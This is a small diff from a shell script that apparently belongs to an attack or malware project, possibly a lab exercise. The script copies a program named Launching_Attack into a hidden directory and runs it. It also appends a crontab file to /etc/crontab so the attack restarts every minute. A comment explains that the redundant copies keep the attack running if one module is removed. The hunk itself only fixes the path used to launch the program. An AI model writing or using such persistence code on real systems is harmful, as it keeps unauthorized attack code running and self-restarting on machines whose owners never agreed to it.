@@ -11,6 +11,6 @@ mkdir -p $Hidden2
 cp ./Infect/Launching_Attack $Hidden2
 
 # When one of attack modules is removed, the attack can still be launched by the other
-./Launching_Attack
+./Infect/Launching_Attack
 echo "$(cat crontab.txt)" >> /etc/crontab
 # trigger automatically every 1 minute, if it is not running
